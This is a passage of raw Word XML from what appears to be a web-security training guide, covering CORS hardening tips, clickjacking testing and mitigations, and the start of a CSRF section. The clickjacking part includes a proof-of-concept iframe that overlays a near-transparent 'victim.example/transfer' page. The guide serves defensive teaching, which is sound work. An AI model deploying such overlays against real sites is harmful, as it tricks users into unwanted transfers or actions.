        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Explicit </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>allowlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> of origins</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520CA5D6" w14:textId="77777777" w:rsidR="00137B98" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Never pair ACAO: * with credentials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3C8B90" w14:textId="77777777" w:rsidR="00137B98" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Tight ACAM/ACAH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF5C6EC" w14:textId="77777777" w:rsidR="00137B98" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Vary: Origin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8C8B98" w14:textId="77777777" w:rsidR="00137B98" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Public vs sensitive API separation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B97EC0" w14:textId="69A6515F" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Prefer token-based </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="63E426CD" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E4075B2" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3188A083" w14:textId="77777777" w:rsidR="00137B98" w:rsidRDefault="00137B98" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69414BC3" w14:textId="77777777" w:rsidR="00137B98" w:rsidRDefault="00137B98" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14225A7C" w14:textId="0054EE00" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="126" w:name="_Toc208408597"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Clickjacking (UI Redress Attack)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="126"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F5F894" w14:textId="6DE96623" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="127" w:name="_Toc208408598"/>
      <w:r>
        <w:t>What is Clickjacking?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="127"/>
    </w:p>
    <w:p w14:paraId="6B4DFBB6" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Clickjacking is a UI redress attack where a user is tricked into clicking something they didn’t intend by overlaying invisible/opaque iframes or buttons. An attacker lures the victim to a malicious page that embeds the target site in a transparent frame.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B9DA27" w14:textId="1D5C495D" w:rsidR="005667D4" w:rsidRDefault="005667D4" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658241" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="787740E9" wp14:editId="4FAA54B0">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>316865</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5486400" cy="3291840"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="155046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63780" name="Picture 1550463780"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="3291840"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BE6CEE" w14:textId="3FB2913A" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="00824DDD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="128" w:name="_Toc208408599"/>
      <w:r>
        <w:t>Threat Model</w:t>
      </w:r>
      <w:bookmarkEnd w:id="128"/>
    </w:p>
    <w:p w14:paraId="0965AB06" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Impact of Clickjacking can include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4FFA05" w14:textId="77777777" w:rsidR="00824DDD" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enabling webcam/mic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16148D95" w14:textId="77777777" w:rsidR="00824DDD" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Submitting forms (money transfers, password changes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76342B84" w14:textId="17B857FF" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Triggering social actions like Like/Follow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A765BC4" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39AB4EF0" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Reason: Browsers allow framing by default, unless the site actively prevents it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F916EC0" w14:textId="77777777" w:rsidR="001E796A" w:rsidRDefault="001E796A" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C0013C4" w14:textId="2197973B" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="001E796A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="129" w:name="_Toc208408600"/>
      <w:r>
        <w:t>How to Test (Step by step)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="129"/>
    </w:p>
    <w:p w14:paraId="2A034A74" w14:textId="5B953735" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Check HTTP Headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4C0E8B" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Look for X-Frame-Options or CSP (Content-Security-Policy) headers using curl or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>devtools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD6D280" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F563079" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Examples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688E5FBB" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>X-Frame-Options: DENY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FB779A" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>X-Frame-Options: SAMEORIGIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222833A7" w14:textId="6EDEEC0B" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Content-Security-Policy: frame-ancestors ‘self’ </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://partner.example</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7B5245F0" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E51F1D7" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>If missing → potentially vulnerable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B77CED" w14:textId="791250A9" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Build a Harmless </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>PoC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4240764D" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Create a test HTML with an iframe:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E073885" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36102A46" w14:textId="29C11355" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">&lt;iframe </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://victim.example/transfer</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> width=”800” height=”600” style=”opacity:0.1; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>position:absolute</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; top:0; left:0; z-index:9999;”&gt;&lt;/iframe&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25327EBF" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>3. Advanced Checks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D352B86" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- Test different browsers (old vs modern)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD367C2" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- Try nested iframes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18403A2C" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- Verify ALL pages, not just login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73046267" w14:textId="6EED9DCE" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="001E796A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="130" w:name="_Toc208408601"/>
      <w:r>
        <w:t>Defensive Mitigations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="130"/>
    </w:p>
    <w:p w14:paraId="0A400102" w14:textId="6F0F7E9D" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>HTTP Headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5473594E" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Use X-Frame-Options or CSP frame-ancestors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6835EC49" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- DENY → No framing allowed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B69C62" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- SAMEORIGIN → Only same-site framing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339A6313" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- CSP frame-ancestors is modern and flexible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D792F7" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>2. Frame Busting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2DD703" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Use JavaScript to prevent framing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029E5A4C" w14:textId="2BAC5D59" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If (top !== self) { </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>top.location</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>self.location</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFABEAC" w14:textId="533A03D4" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Not foolproof, use as defense-in-depth only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217194A5" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>3. UI Design Mitigations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D60455A" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- Double-click or re-authentication for critical actions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11514525" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cookies to reduce CSRF + Clickjacking combos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D65FCD" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>- Visual cues (modals, confirmations)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DDEDBA" w14:textId="5D4C94DB" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04F5E6F2" w14:textId="77777777" w:rsidR="008D0DFA" w:rsidRDefault="008D0DFA" w:rsidP="008D0DFA">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03D350F8" w14:textId="77777777" w:rsidR="00491EB0" w:rsidRDefault="00491EB0" w:rsidP="00491EB0">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="131" w:name="_Toc208408602"/>
      <w:r>
        <w:t>Cross Site Request Forgery</w:t>
      </w:r>
      <w:bookmarkEnd w:id="131"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FFBE02" w14:textId="79A681ED" w:rsidR="00A6171B" w:rsidRPr="00A6171B" w:rsidRDefault="00A6171B" w:rsidP="00491EB0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="132" w:name="_Toc208408603"/>
      <w:r>
        <w:t>What is CSRF?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="132"/>
    </w:p>
    <w:p w14:paraId="25292407" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">CSRF is an attack that forces a victim’s browser to perform an unwanted action on a web application where they are authenticated. Since browsers automatically attach cookies, HTTP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
